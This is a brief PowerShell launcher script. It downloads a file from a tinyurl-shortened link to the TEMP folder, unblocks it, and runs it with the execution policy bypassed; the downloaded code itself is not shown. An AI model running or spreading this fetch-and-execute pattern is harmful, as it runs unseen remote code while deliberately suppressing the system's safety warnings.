$scriptUrl = "https://tinyurl.com/cpwrshell"
$localPath = "$env:TEMP\menu.ps1"

# Download the script with correct encoding
Invoke-WebRequest -Uri $scriptUrl -OutFile $localPath

# Convert file encoding to UTF-8 without BOM
$scriptContent = Get-Content -Path $localPath -Raw
$scriptContent | Set-Content -Path $localPath -Encoding utf8

# Unblock the file to avoid execution warnings
Unblock-File -Path $localPath

# Execute the script
PowerShell -ExecutionPolicy Bypass -File $localPath
